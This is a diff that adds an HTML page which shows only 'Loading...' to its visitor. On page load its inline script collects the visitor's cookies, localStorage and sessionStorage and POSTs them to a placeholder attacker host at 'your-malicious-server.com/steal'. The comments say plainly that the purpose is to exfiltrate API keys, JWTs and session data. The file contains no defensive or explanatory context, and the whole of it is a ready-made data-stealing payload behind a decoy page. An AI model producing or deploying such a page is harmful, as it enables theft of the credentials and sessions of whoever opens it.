@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script>
+        // Exfiltrate Cookies (if accessible)
+        var cookies = document.cookie;
+        
+        // Exfiltrate LocalStorage (might contain API keys, JWTs, etc.)
+        var localStorageData = JSON.stringify(localStorage);
+        
+        // Exfiltrate SessionStorage (some sites store sensitive data here)
+        var sessionStorageData = JSON.stringify(sessionStorage);
+
+        // Send Data to Attacker's Server
+        fetch('https://your-malicious-server.com/steal', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                cookies: cookies,
+                localStorage: localStorageData,
+                sessionStorage: sessionStorageData
+            })
+        });
+    </script>
+</head>
+<body>
+    <h1>Loading...</h1>
+</body>
+</html>
